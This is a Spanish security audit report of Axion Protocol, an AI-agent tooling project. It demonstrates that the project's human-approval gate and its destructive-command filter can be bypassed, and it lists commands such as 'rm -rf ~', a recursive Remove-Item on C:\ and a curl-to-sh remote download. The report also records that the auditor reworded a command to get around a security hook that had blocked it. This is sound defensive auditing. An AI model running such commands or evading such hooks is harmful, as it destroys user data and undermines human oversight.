# AXION PROTOCOL — INFORME DE AUDITORÍA INDEPENDIENTE — FASE A (CIEGA)

**Corpus:** `C:\Users\Ayco\Shoshin\Project\Axion Protocol`
**Fecha de ejecución:** 2026-08-03
**Mission Compiler:** V0.5
**Auditor:** sesión independiente, sin acceso a informes previos

---

## 1. Gate de independencia

```yaml
independence_gate:
  previous_reports_visible: false
  previous_findings_known: false
  previous_verdict_known: false
  blind_phase_feasible: true
  justification: >
    La sesión no contiene auditorías anteriores, identificadores de hallazgos previos,
    severidades previas ni veredictos previos. Se verificó que el corpus no contiene
    archivos de informe de auditoría de Axion Protocol (el inventario completo de 67
    archivos en alcance está listado en §3). Los únicos documentos de revisión presentes
    (`archive_manifest/zetprog_component_review.md|.csv`) son manifiestos de linaje
    conceptual de un proyecto anterior (ZetProG), no auditorías de este corpus, y fueron
    tratados como corpus, no como resultados previos. No se simuló ceguera: no existía
    información previa que ocultar.
```

---

## 2. Contrato de entrada

```yaml
input_contract:
  project_root: "C:\\Users\\Ayco\\Shoshin\\Project\\Axion Protocol"
  corpus_attached: true
  corpus_accessible: true
  manifest_available: false          # no existe package.json ni manifiesto de build
  runtime_declared: partial          # CLAUDE.md exige Node.js; ninguna versión declarada
  files_available: 67                # excluyendo internos de .git
  reports_available: 0
  missing_expected_inputs:
    - declaración de versión mínima de Node.js
    - manifiesto de dependencias o de ausencia de dependencias
    - procedimiento de rollback del instalador
```

**Nota de delimitación.** El directorio de trabajo (`C:\Users\Ayco\Shoshin`) contiene
14 507 archivos en cuatro árboles no relacionados. El corpus se delimitó a
`Project\Axion Protocol` por identidad explícita del proyecto nombrado en la misión. No
se auditó `AgentProtocol\`, `Genius\`, `ZetG\`, `WhiteRoom\`, `ValorantCoach\` ni
`Temp\`; su exclusión se registra en §3.

---

## 3. Inventario de alcance

```yaml
scope_inventory:
  files_total: 67
  files_in_scope: 67
  entrypoints:
    - install.js                       # CLI + módulo
    - index.html                       # interfaz web principal
    - script.js                        # motor de la interfaz web
    - tools/dashboard.html             # panel "No-Code"
    - tools/presentation.html          # redirección
    - tools/*.js                       # 7 CLI + módulos
    - tests/*.js                       # 8 ejecutables
  executable_files: 16                 # 9 .js de tools+install, 8 .js de tests (script.js no es Node)
  user_interface_entrypoints:
    - index.html
    - tools/dashboard.html
    - tools/presentation.html
  security_controls:
    - tools/preflight.js               # barrera de comandos destructivos + Zero-Bloat Gate
    - tools/vibeguard.js               # linter estático de antipatrones
  authorization_modules:
    - tools/workflow_runner.js         # paso 3: GATE de aprobación humana
    - policies/authority.yaml          # DOCUMENT_ONLY
    - policies/risk.yaml               # DOCUMENT_ONLY
    - policies/promotion.yaml          # DOCUMENT_ONLY
  destructive_operation_modules:
    - install.js                       # escribe y sobrescribe en un destino arbitrario
    - tests/install.test.js            # rmSync recursivo
    - tools/learning_engine.js         # escritura/truncado de LEARNINGS.md
  evidence_generators:
    - tools/evidence_hasher.js
    - tools/workflow_runner.js         # emite el veredicto VERIFIED
  data_writers:
    - install.js
    - tools/learning_engine.js
  data_deleters:
    - tools/learning_engine.js         # por vía de fallback (ver AX-F-006)
    - tests/install.test.js
    - tests/learning_git.test.js
  installers:
    - install.js
  test_files: 8
  schemas: 10
  documentation_only_files: 30
  external_resources:
    - https://fonts.googleapis.com     # index.html, tools/dashboard.html
    - https://fonts.gstatic.com        # index.html, tools/dashboard.html
    - https://json-schema.org/...      # sólo como $schema URI, nunca se descarga
  excluded_files:
    - path: ".git/**"
      reason: >
        Internos del control de versiones. Se inspeccionaron metadatos operativos
        (log, status, refs) por línea de comandos; los objetos comprimidos no forman
        parte de la superficie ejecutable ni de la superficie de interfaz.
    - path: "scratch/"
      reason: "Directorio vacío (0 entradas). Es destino de escritura de dos pruebas."
```

---

## 4. Contrato del entorno

```yaml
environment_contract:
  operating_system: "Microsoft Windows 11 Enterprise LTSC 2024 (10.0.26100)"
  runtime: "Node.js"
  runtime_version: "v24.18.0 (npm 11.16.0)"
  browser_engine: NOT_USED             # no se renderizaron las interfaces web
  filesystem: "NTFS"
  privileges: "usuario no administrador (IsInRole(Administrator) = False)"
  network_access: "no utilizado; ninguna prueba requirió red"
  available_tools:
    - node v24.18.0
    - git 2.55.0.windows.3
    - PowerShell 5.1.26100.8894
    - crypto (SHA-256 nativo)
  unavailable_tools:
    - instrumentación de cobertura (c8/nyc no instalados; instalarlos violaría Zero-Bloat)
    - validador de JSON Schema (ajv no disponible; conformidad verificada manualmente)
    - motor de navegador para renderizar index.html / dashboard.html
  restrictions:
    - "Un hook de seguridad del entorno bloquea patrones que contengan rutas .git en
       comandos de shell, incluso en operaciones de sólo lectura (falso positivo).
       Se reformuló el comando; no afectó a ningún resultado."
  blocked_tests:
    - "Ejecución real de los comandos destructivos que preflight.js no detiene.
       No se ejecutan por ser destructivos e irreversibles; se verifica el veredicto
       del control, no el efecto del comando."
    - "Provocar el fallo natural de fs.appendFileSync mediante ACL de Windows
       (denegar FILE_APPEND_DATA conservando FILE_WRITE_DATA). No se ejecutó por
       requerir modificación de permisos; se sustituyó por inyección de fallo
       determinista, con la limitación declarada en AX-F-006."
```

**Metodología.** Todos los experimentos se ejecutaron sobre una **copia aislada** del
corpus en el directorio temporal de la sesión, verificada por SHA-256 contra el
original (3 archivos de control, coincidencia total). El corpus original no fue
modificado en ningún momento. Se comprobó al cierre que `git status` del corpus original
es idéntico al inicial (3 modificados, 27 sin seguimiento).

---

## 5. Cobertura

```yaml
coverage:
  files_read_in_full: 66
  files_read_partially: 1              # style.css: inspección dirigida (métricas + recursos externos)
  files_never_read: 0
  mandatory_files_complete: true
  lines_inspected: 3246
  lines_executed: NOT_MEASURED         # sin instrumentación de cobertura disponible
  branch_coverage: NOT_MEASURED
  tests_executed: 8                    # los 8 archivos de tests/, todos con exit code 0
  tests_not_executed: 0
  tests_missing:
    - fallo cerrado ante valores de riesgo no canónicos
    - conformidad del manifiesto de evidencia con evidence.schema.json
    - preservación de LEARNINGS.md ante fallo de escritura
    - preservación de configuración preexistente en el destino del instalador
    - rollback del instalador
    - variantes destructivas equivalentes en preflight
  unresolved_lines: 630                # style.css, sin relación con ningún hallazgo
```

`style.css` no pertenece a ninguna categoría de inspección obligatoria (§7 de la misión)
y no participa en ningún hallazgo MEDIUM o superior. Su inspección dirigida cubrió:
719 líneas físicas, 1 uso de `!important`, 0 `url()` externas, 0 `@import`,
0 reglas `prefers-reduced-motion`.

---

## 6. Hallazgos vigentes

### AX-F-001 — El instalador destruye la configuración preexistente del usuario sin respaldo ni confirmación

```yaml
id: AX-F-001
title: install.js sobrescribe CLAUDE.md y .agents/AGENTS.md preexistentes sin respaldo, aviso ni confirmación
category: destructive_operations
defect:
  status: CONFIRMED
  certainty: reproducción directa
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: NOT_A_CONTROL
  status: NOT_APPLICABLE
current_exposure:
  status: EXECUTED
  consumer: "usuario final; README.md §'Inicio Rápido' y index.html §04 lo presentan como el comando de entrada"
  execution_path: "node install.js  ->  main()  ->  runInstallation(process.cwd())  ->  fs.copyFileSync"
remediation_priority:
  level: P1
  justification: >
    Impacto HIGH demostrado sobre datos del usuario, en la ruta de ejecución más
    publicitada del producto y sin ninguna barrera previa.
severity_justification:
  theoretical_risk: "copyFileSync sobrescribe incondicionalmente el destino"
  observed_behavior: >
    Sobre un proyecto con CLAUDE.md y .agents/AGENTS.md propios, ambos fueron
    reemplazados. Ninguna copia de respaldo fue creada. El instalador devolvió
    {"status":"SUCCESS","filesCount":11} e imprimió "Instalación completada exitosamente".
  demonstrated_consequence: >
    Pérdida irreversible (fuera de git) de las instrucciones de proyecto del usuario.
    CLAUDE.md es precisamente el archivo donde Claude Code almacena las reglas del
    proyecto, por lo que la colisión es el caso esperado, no el excepcional.
  matrix_result: "DEMONSTRATED x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [install.js]
lines: [35-53, 65-72]
evidence:
  type: EXPERIMENT
  procedure: >
    E8a. Directorio destino con CLAUDE.md ("# Instrucciones del proyecto del usuario /
    - No toques la carpeta /produccion / - Claves en .env.local") y
    .agents/AGENTS.md ("# Reglas propias del equipo ..."). Se invoca runInstallation(destino).
  observed_output: |
    CLAUDE.md del usuario antes .....: "# Instrucciones del proyecto del usuario\n\n- N"...
    CLAUDE.md del usuario despues ...: "# Claude Code Configuration for Axion Protoco"...
    contenido original conservado ...: false
    AGENTS.md original conservado ...: false
    copia de respaldo creada ........: false
    valor devuelto ..................: {"status":"SUCCESS","installedRoot":"...","filesCount":11}
  assumptions: "ninguna; ejecución directa del módulo publicado"
  limitations: "no se evaluó el comportamiento si el destino está en un volumen de red"
reproduction: |
  mkdir proyecto && cd proyecto
  echo "# mis reglas" > CLAUDE.md
  node <ruta-axion>/install.js --target .
  type CLAUDE.md    # contenido propio perdido
expected: >
  Detección de colisión, respaldo con marca temporal o interrupción solicitando
  confirmación humana. La propia AGENTS.md del proyecto lo exige: "Está estrictamente
  prohibido ... reemplazar los aportes e intenciones del usuario". policies/risk.yaml
  clasifica la persistencia irreversible como HIGH, con `human_gate_required: true`.
observed: sobrescritura silenciosa con veredicto SUCCESS
minimal_remediation: >
  Antes de cada copyFileSync: si existe el destino y su hash difiere del origen,
  copiar a `<archivo>.axion-backup-<ISO8601>` y registrarlo, o abortar con código
  distinto de cero salvo `--force` explícito.
regression_risk: "bajo; tests/install.test.js opera sobre un destino recién creado y vacío"
remaining_unknowns: "comportamiento con destinos de sólo lectura o con archivos bloqueados"
```

---

### AX-F-002 — El gate de aprobación humana falla-abierto ante cualquier valor de riesgo no canónico

```yaml
id: AX-F-002
title: El GATE del paso 3 sólo bloquea con los literales exactos 'HIGH' y 'CRITICAL'; cualquier otro valor lo omite
category: authorization_bypass
defect:
  status: CONFIRMED
  certainty: reproducción directa sobre 10 variantes
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: SECURITY_BOUNDARY
  status: BROKEN
current_exposure:
  status: INDIRECT
  consumer: "tests/workflow.test.js y tests/clarifier.test.js; ningún consumidor de producción"
  execution_path: "executeHybridWorkflow(payload) -> paso 3 -> comparación estricta de cadenas"
remediation_priority:
  level: P1
  justification: "control declarado SECURITY_BOUNDARY roto; §17 asigna P1 con independencia de la exposición"
severity_justification:
  theoretical_risk: "comparación por igualdad estricta contra dos literales, sin normalizar ni validar el dominio"
  observed_behavior: >
    'high', 'Critical', 'HIGH ' (con espacio final), 'SEVERE', 'CATASTROPHIC',
    undefined, null y 999 producen VERIFIED sin aprobación humana. Sólo 'HIGH' y
    'CRITICAL' exactos bloquean.
  demonstrated_consequence: >
    El gate de autorización se omite y el flujo emite el veredicto final favorable.
    Un error tipográfico de mayúsculas o un valor fuera de dominio anula la única
    barrera de autorización del protocolo. El comportamiento es fail-open, en
    contradicción directa con `policies/authority.yaml: missing_identity_behavior: FAIL_CLOSED`
    y con `docs/threat_model.md` amenaza 2 ("autoaprobación del ejecutor").
  matrix_result: "DEMONSTRATED x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/workflow_runner.js]
lines: [26, 53-61]
evidence:
  type: EXPERIMENT
  procedure: "E3. executeHybridWorkflow con humanApproval:false e intención clara, variando únicamente `risk`."
  observed_output: |
    risk="HIGH"           -> BLOCKED_GATE_REQUIRED      BLOQUEADO
    risk="CRITICAL"       -> BLOCKED_GATE_REQUIRED      BLOQUEADO
    risk="high"           -> VERIFIED                   *** GATE OMITIDO ***
    risk="Critical"       -> VERIFIED                   *** GATE OMITIDO ***
    risk="HIGH "          -> VERIFIED                   *** GATE OMITIDO ***
    risk="SEVERE"         -> VERIFIED                   *** GATE OMITIDO ***
    risk="CATASTROPHIC"   -> VERIFIED                   *** GATE OMITIDO ***
    risk=undefined        -> VERIFIED                   *** GATE OMITIDO ***
    risk=null             -> VERIFIED                   *** GATE OMITIDO ***
    risk=999              -> VERIFIED                   *** GATE OMITIDO ***
  assumptions: "el campo `risk` procede del llamador, tal como está definido en la firma del módulo"
  limitations: >
    No existe hoy un consumidor de producción de executeHybridWorkflow. La severidad
    describe el impacto del control; la exposición se declara por separado como INDIRECT.
reproduction: |
  node -e "const{executeHybridWorkflow}=require('./tools/workflow_runner.js');
  console.log(executeHybridWorkflow({title:'x',rawUserRequest:'Ejecutar la migracion masiva de la capa de persistencia hacia la nueva estructura.',risk:'high',humanApproval:false}).status)"
  # -> VERIFIED
expected: "cualquier valor no perteneciente a {LOW,MEDIUM,HIGH,CRITICAL} debe bloquear (fail-closed)"
observed: "cualquier valor no reconocido continúa el flujo hasta VERIFIED"
minimal_remediation: >
  Normalizar (`String(risk).trim().toUpperCase()`), validar contra el dominio de
  policies/risk.yaml y bloquear con BLOCKED_INVALID_RISK cuando el valor no pertenezca
  al dominio o falte.
regression_risk: "nulo; los tests existentes usan los literales canónicos"
remaining_unknowns: "ninguno"
```

---

### AX-F-003 — El orquestador emite el veredicto VERIFIED sin ejecutar ninguna verificación

```yaml
id: AX-F-003
title: executeHybridWorkflow devuelve VERIFIED sin ejecutar aserciones, comandos ni comprobaciones
category: evidence_integrity
defect:
  status: CONFIRMED
  certainty: reproducción directa
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: IMPORTANT_CONTROL
  status: BROKEN
current_exposure:
  status: INDIRECT
  consumer: "tests/workflow.test.js; el README lo publica como 'Orquestador ejecutable de las 7 fases'"
  execution_path: "executeHybridWorkflow -> paso 4 (contador) -> paso 6 -> return {status:'VERIFIED'}"
remediation_priority:
  level: P1
  justification: "produce evidencia materialmente falsa sobre el estado de verificación de una tarea"
severity_justification:
  theoretical_risk: "el paso 4 cuenta `testAssertions.length`; nunca ejecuta ninguna aserción"
  observed_behavior: >
    Con testAssertions: [], commandToExecute: '' y modifiedFiles apuntando a dos
    archivos inexistentes, el resultado es VERIFIED, el manifiesto contiene 0 archivos
    y el paso 4 sólo registra "ADVERTENCIA: No se definieron aserciones de prueba previas".
  demonstrated_consequence: >
    Una tarea sin una sola comprobación ejecutada queda etiquetada VERIFIED, estado que
    docs/terminology.md define expresamente como "requiere una comprobación
    independiente", y acompañada de un manifiesto con metadata.status APPROVED. La
    ausencia de aserciones es una advertencia no bloqueante, no un fallo cerrado.
  matrix_result: "DEMONSTRATED x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/workflow_runner.js]
lines: [64-69, 88-110]
evidence:
  type: EXPERIMENT
  procedure: "E4. Tarea de riesgo LOW, sin aserciones, sin comando y con archivos modificados inexistentes."
  observed_output: |
    status final ......: VERIFIED
    archivos con hash ..: 0 (se declararon 2)
    metadata.status ....: APPROVED
    approval ...........: {"required":false,"state":"APPROVED"}
    log paso 4 .........: [4. TEST] ADVERTENCIA: No se definieron aserciones de prueba previas.
    log paso 6 .........: [6. AUDITAR] Manifiesto de evidencia SHA-256 generado (Identity: AX-EVI-...).
  assumptions: ninguna
  limitations: "no existe consumidor de producción que actúe sobre el veredicto"
reproduction: "ver bloque E4 del arnés de experimentos"
expected: >
  Sin aserciones ejecutadas y con archivos declarados ausentes, el veredicto debe ser
  BLOCKED o FAILED. AGENTS.md §Blindaje 4 lo exige: "Jamás declarar éxito sin ejecutar
  la suite de pruebas y mostrar la salida PASS".
observed: VERIFIED + manifiesto APPROVED
minimal_remediation: >
  (a) `testAssertions.length === 0` debe devolver BLOCKED_NO_CHECKS;
  (b) todo `modifiedFiles` inexistente debe devolver FAILED_EVIDENCE;
  (c) reservar VERIFIED para el caso en que se haya ejecutado y superado una comprobación real.
regression_risk: "medio; tests/workflow.test.js caso 1 asume VERIFIED con 1 aserción declarada y no ejecutada"
remaining_unknowns: "ninguno"
```

---

### AX-F-004 — El generador de evidencia se autoaprueba, omite archivos en silencio e incumple su propio esquema

```yaml
id: AX-F-004
title: createEvidenceManifest sella APPROVED, descarta archivos ausentes sin señalarlo y no conforma evidence.schema.json
category: evidence_integrity
defect:
  status: CONFIRMED
  certainty: reproducción directa + demostración estática concluyente contra el esquema
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: IMPORTANT_CONTROL
  status: BROKEN
current_exposure:
  status: REACHABLE
  consumer: "CLI documentado en CLAUDE.md fase 6 y en .claude/CLAUDE.md; consumido por workflow_runner.js"
  execution_path: "node tools/evidence_hasher.js <archivos>  |  require -> createEvidenceManifest"
remediation_priority:
  level: P1
  justification: "el artefacto de evidencia del protocolo es incompleto, autoaprobado y no validable"
severity_justification:
  theoretical_risk: "existsSync como guarda silenciosa; metadata literal APPROVED; hashFile devuelve null ante error"
  observed_behavior: >
    Con 2 archivos solicitados (uno inexistente) el manifiesto contiene 1 y no declara
    la omisión. `evidence_id` = AX-EVI-7465 no satisface el patrón `^AX-EVD-[0-9]{4,}$`.
    De las 16 propiedades exigidas en la raíz por evidence.schema.json, faltan 15.
  demonstrated_consequence: >
    El manifiesto no es validable contra el contrato que el propio README declara
    ("Emite manifiesto JSON conforme a schemas/evidence.schema.json": afirmación falsa),
    afirma `approval: {required:false, state:APPROVED}` sin intervención humana —
    prohibido por policies/authority.yaml ("executor may_not approve_own_result") — y
    puede presentar como completa una evidencia a la que le faltan archivos.
  matrix_result: "DEMONSTRATED x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/evidence_hasher.js, schemas/evidence.schema.json, README.md]
lines: ["evidence_hasher.js:15-24, 43-56, 65-89", "evidence.schema.json:8-19"]
evidence:
  type: EXPERIMENT
  procedure: "E6. createEvidenceManifest({files:['NO_EXISTE.txt', README.md]}) y comparación campo a campo con el esquema."
  observed_output: |
    archivos solicitados: 2 | archivos en el manifiesto: 1
    evidence_id: AX-EVI-7465 | exige el esquema ^AX-EVD-[0-9]{4,}$ -> false
    propiedades requeridas por evidence.schema.json ausentes en la raiz: 15 / 16
      identifier, version, date, provenance, status, owner, risk, evidence, approval,
      evidence_type, source, location, hash_algorithm, hash, retention_class
  assumptions: >
    La validación de esquema se realizó manualmente campo a campo (no hay validador
    disponible sin violar Zero-Bloat). Los metadatos se emiten anidados bajo `metadata`
    y bajo la clave `identity`, mientras el esquema los exige en la raíz y como `identifier`.
  limitations: "no se evaluó `unevaluatedProperties:false`, que añadiría 7 violaciones más"
reproduction: |
  node -e "const{createEvidenceManifest}=require('./tools/evidence_hasher.js');
  const m=createEvidenceManifest({files:['NO_EXISTE.txt']});
  console.log(m.files.length, m.evidence_id, m.metadata.status)"
  # -> 0 AX-EVI-#### APPROVED
expected: >
  Registrar toda entrada solicitada con su estado (`MISSING`, `UNREADABLE`), emitir
  `approval.state: NOT_REQUIRED` o `WAITING`, y conformar el esquema declarado.
observed: "omisión silenciosa, autoaprobación y no conformidad"
minimal_remediation: >
  (a) incluir cada archivo solicitado con `status` explícito y devolver el manifiesto
  como INCOMPLETE si falta alguno; (b) `approval.state = 'WAITING'` por defecto;
  (c) alinear raíz, nombres de campo y prefijo del identificador con evidence.schema.json.
regression_risk: >
  alto sobre tests/adversarial.test.js:41, que asevera `metadata.status === 'APPROVED'`
  y por tanto certifica el defecto (ver AX-F-012)
remaining_unknowns: "ninguno"
```

---

### AX-F-005 — La barrera de comandos destructivos no detiene 17 de 20 variantes equivalentes

```yaml
id: AX-F-005
title: runPreflight devuelve PASS ante formas habituales y equivalentes de los comandos que declara bloquear
category: destructive_operations
defect:
  status: CONFIRMED
  certainty: reproducción directa sobre 20 comandos
impact:
  status: DEMONSTRATED
  magnitude: MAJOR
severity:
  current: HIGH
  potential: CRITICAL
control_integrity:
  role: SECURITY_BOUNDARY
  status: BROKEN
current_exposure:
  status: INDIRECT
  consumer: >
    Agente de IA que sigue CLAUDE.md ("All generated shell/powershell wrapper commands
    MUST pass node tools/preflight.js") y workflow_runner.js. No existe hook,
    envoltorio ni enforcement técnico: la barrera depende de que el agente la invoque
    voluntariamente y honre el veredicto.
  execution_path: "node tools/preflight.js \"<cmd>\"  |  workflow_runner paso 5"
remediation_priority:
  level: P1
  justification: "barrera destructiva declarada SECURITY_BOUNDARY, rota de forma reproducible"
severity_justification:
  theoretical_risk: "cuatro expresiones regulares literales frente a un espacio de comandos abierto"
  observed_behavior: >
    17 de 20 comandos no fueron detenidos. Los 3 bloqueados son exactamente las formas
    literales que aparecen en la suite de pruebas y en la landing. El filtro no
    reconoce reordenación de flags, alias, rutas antes de flags, cmd.exe ni objetivos
    distintos de la raíz.
  demonstrated_consequence: >
    Un comando que borra el home del usuario (`rm -rf ~`), el directorio actual
    (`rm -rf .`), un árbol completo en PowerShell con la sintaxis más habitual
    (`Remove-Item C:\ -Recurse -Force`) o desde cmd (`rd /s /q C:\Users`,
    `del /f /s /q C:\*.*`) obtiene el veredicto PASS y el sello
    "Filtro de seguridad de patrones destructivos OK".
  matrix_result: >
    DEMONSTRATED x MAJOR = HIGH. No se eleva a CATASTROPHIC porque no se ejecutó
    ningún comando destructivo: lo demostrado es el fallo de la barrera, no la
    destrucción de datos.
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: INFERRED       # el efecto destructivo no se ejecutó deliberadamente
files: [tools/preflight.js]
lines: [59-75, 77-86]
evidence:
  type: EXPERIMENT
  procedure: "E2. runPreflight sobre 20 comandos, incluido un control negativo inocuo."
  observed_output: |
    STOP | rm -rf /                                    | linea base documentada
    STOP | rm -rf / --no-preserve-root                 | variante mostrada en la landing
    PASS | rm -rf --no-preserve-root /                 | mismo efecto, orden de flags invertido
    PASS | rm -fr /                                    | orden de letras del flag invertido
    PASS | rm -rf ~                                    | borrado del home del usuario
    PASS | rm -rf .                                    | borrado del directorio actual
    PASS | rm -rf $HOME/Documents                      | borrado de documentos
    STOP | Remove-Item -Recurse -Force C:\             | linea base PowerShell
    PASS | Remove-Item -Force -Recurse C:\             | flags PowerShell intercambiados
    PASS | Remove-Item C:\ -Recurse -Force             | ruta antes de los flags (idioma PS habitual)
    PASS | Remove-Item -Path C:\Users -Recurse -Force  | con -Path explicito
    PASS | ri C:\Users\Ayco -r -fo                     | alias PowerShell abreviado
    PASS | rd /s /q C:\Users                           | comando cmd.exe
    PASS | del /f /s /q C:\*.*                         | del recursivo cmd.exe
    PASS | git clean -xffd                             | borra todo lo no versionado
    PASS | git reset --hard HEAD~50                    | descarta commits
    PASS | npm install                                 | Zero-Bloat Gate sin nombre de paquete
    PASS | npm ci                                      | instalacion limpia de dependencias
    PASS | curl http://x.test/s.sh | sh                | descarga y ejecucion remota
    PASS | git status                                  | control negativo: comando inocuo
    --> comandos que NO fueron detenidos: 17/20
  assumptions: "ninguno de los comandos fue ejecutado; se evalúa exclusivamente el veredicto del control"
  limitations: >
    Una lista de bloqueo nunca es exhaustiva; el hallazgo no afirma que exista un
    conjunto cerrado de bypasses, sino que las formas más habituales no se cubren.
reproduction: 'node tools/preflight.js "Remove-Item C:\ -Recurse -Force"   # -> PASS'
expected: >
  Fallo cerrado: ante un comando que no se puede clasificar con confianza, STOP y
  decisión humana. policies/risk.yaml lista `destructive_action_without_gate` entre
  las `closed_failure_conditions`.
observed: "PASS con el sello explícito de filtro de seguridad superado"
minimal_remediation: >
  Invertir la política: lista de permitidos por verbo inicial (git status/log/diff,
  node, npm run, …) y STOP por defecto; o, como mínimo, detener por verbo destructivo
  (rm, rmdir, rd, del, Remove-Item, ri, erase, Format-*, git clean, git reset --hard)
  con independencia de flags, orden y objetivo, exigiendo aprobación humana.
regression_risk: "medio; una lista de permitidos aumentará los STOP sobre comandos legítimos (ver AX-F-013)"
remaining_unknowns: "cobertura frente a comandos codificados (base64, -EncodedCommand) — no evaluada"
```

---

### AX-F-006 — El motor de aprendizaje destruye LEARNINGS.md cuando falla la escritura, y reporta éxito

```yaml
id: AX-F-006
title: El fallback de captureHumanFeedback trunca el archivo de memoria durable y devuelve LEARNING_RECORDED
category: silent_error_handling
defect:
  status: CONFIRMED
  certainty: demostración estática concluyente + reproducción con fallo inyectado
impact:
  status: LIKELY
  magnitude: MAJOR
severity:
  current: HIGH
  potential: HIGH
control_integrity:
  role: NOT_A_CONTROL
  status: NOT_APPLICABLE
current_exposure:
  status: REACHABLE
  consumer: "CLI documentado; workflow_runner.js paso 7; LEARNINGS.md real del proyecto (5 lecciones)"
  execution_path: "captureHumanFeedback -> catch(appendFileSync) -> writeFileSync (truncado)"
remediation_priority:
  level: P1
  justification: "ruta de destrucción de datos durables, silenciosa y con reporte de éxito"
severity_justification:
  theoretical_risk: "writeFileSync en el catch de appendFileSync trunca el archivo completo"
  observed_behavior: >
    Con appendFileSync fallando (EPERM), un archivo de 216 bytes con 3 lecciones
    históricas quedó en 136 bytes con 1 lección. El error no se registra, no se
    propaga y la función devuelve LEARNING_RECORDED.
  demonstrated_consequence: >
    Destrucción completa del historial acumulado de LEARNINGS.md — el artefacto que
    el paso 7 del protocolo y la regla C10 definen como memoria durable — presentada
    al llamador como una operación exitosa.
  matrix_result: "LIKELY x MAJOR = HIGH"
causal_chain:
  defect: CONFIRMED
  trigger: INFERRED           # no se reprodujo un fallo natural de appendFileSync
  execution_path: CONFIRMED
  consequence: CONFIRMED
files: [tools/learning_engine.js]
lines: [65-69]
evidence:
  type: EXPERIMENT
  procedure: >
    E7. Archivo con 3 lecciones previas. Se sustituye fs.appendFileSync por una función
    que lanza EPERM (inyección de fallo determinista), se invoca captureHumanFeedback
    y se restaura fs. Se compara el contenido antes y después.
  observed_output: |
    bytes antes ..........: 216      lecciones antes ......: 3
    resultado devuelto ...: LEARNING_RECORDED (el fallo no se reporta al llamador)
    bytes despues ........: 136      lecciones despues ....: 1
    historial conservado .: false
  assumptions: >
    Requiere que appendFileSync falle mientras writeFileSync sigue operativo. En
    Windows esto es alcanzable de forma natural cuando una ACL deniega
    FILE_APPEND_DATA conservando FILE_WRITE_DATA, o ante violaciones de compartición
    transitorias. Esa reproducción natural NO se ejecutó (ver environment_contract).
  limitations: >
    Por eso el impacto se clasifica LIKELY y no DEMONSTRATED: el defecto y la
    consecuencia son ciertos; la frecuencia del disparador natural no está medida.
reproduction: "ver bloque E7 del arnés de experimentos (inyección de fallo)"
expected: >
  El fallback jamás debe truncar. Si el append falla, propagar el error o escribir
  en un archivo lateral; nunca reemplazar el contenido acumulado.
observed: "truncado completo + estado LEARNING_RECORDED"
minimal_remediation: >
  Eliminar el writeFileSync del catch. Si el archivo no existe, crearlo con
  `flag:'wx'` antes de anexar; si el append falla, devolver
  `{status:'LEARNING_FAILED', error}` sin escribir.
regression_risk: "nulo; el caso de creación inicial lo cubre appendFileSync, que ya crea el archivo"
remaining_unknowns: "frecuencia real del disparador en Windows con antivirus o sincronización en la nube"
```

---

### AX-F-007 — El asistente Git afirma un respaldo en la nube que no existe

```yaml
id: AX-F-007
title: getGitStatusDiagnosis declara "100% guardado y respaldado en GitHub" con commits sin publicar y remotos que no son GitHub
category: silent_error_handling
defect:
  status: CONFIRMED
  certainty: reproducción directa
impact:
  status: DEMONSTRATED
  magnitude: MODERATE
severity:
  current: MEDIUM
  potential: HIGH
control_integrity:
  role: SUPPORTING_CONTROL
  status: BROKEN
current_exposure:
  status: REACHABLE
  consumer: "usuario no técnico (público objetivo declarado del módulo)"
  execution_path: "node tools/git_assistant.js -> getGitStatusDiagnosis"
remediation_priority:
  level: P2
  justification: >
    Información materialmente incorrecta sobre el estado de respaldo, dirigida
    precisamente a quien no puede verificarla por otros medios.
severity_justification:
  theoretical_risk: "hasRemote se deriva de `git remote` no vacío; no se consulta ahead/behind ni el host"
  observed_behavior: >
    Repositorio con 1 commit local nunca publicado y remoto
    https://gitlab.example.test/... — el diagnóstico es CLEAN_SYNCED con el mensaje
    "✓ Tu proyecto está 100% guardado y respaldado en GitHub." y `suggestion: null`.
  demonstrated_consequence: >
    Dos afirmaciones falsas simultáneas: el trabajo no está respaldado en ningún
    servidor, y el remoto no es GitHub. Al suprimirse la sugerencia de respaldo, el
    usuario no recibe ninguna señal para actuar.
  matrix_result: "DEMONSTRATED x MODERATE = MEDIUM"
causal_chain:
  defect: CONFIRMED
  trigger: CONFIRMED
  execution_path: CONFIRMED
  consequence: CONFIRMED      # el mensaje falso está demostrado; la pérdida de datos posterior no
files: [tools/git_assistant.js]
lines: [31-49]
evidence:
  type: EXPERIMENT
  procedure: "E9. Repositorio nuevo, un commit, remoto GitLab añadido, sin push. Árbol limpio."
  observed_output: |
    commits locales sin publicar ....: 1
    remoto configurado ..............: https://gitlab.example.test/usuario/proyecto.git
    push realizado alguna vez .......: no
    --> status ......................: CLEAN_SYNCED
    --> mensaje al usuario ..........: "✓ Tu proyecto está 100% guardado y respaldado en GitHub."
    --> sugerencia ..................: null
  assumptions: ninguna
  limitations: "la pérdida efectiva de trabajo requiere un fallo posterior de disco; no se demuestra aquí"
reproduction: "git init; commit; git remote add origin <url>; node tools/git_assistant.js"
expected: >
  Comprobar `git rev-list --count @{u}..HEAD` y la existencia de upstream; nombrar el
  host real o usar un término neutro ("servidor remoto").
observed: "afirmación de respaldo completo sin comprobar publicación ni host"
minimal_remediation: >
  Distinguir tres estados: sin remoto / con remoto y commits sin publicar / publicado
  y verificado, y no usar la palabra "GitHub" salvo que la URL lo sea.
regression_risk: "bajo"
remaining_unknowns: "comportamiento con múltiples remotos o upstream no configurado"
```

---

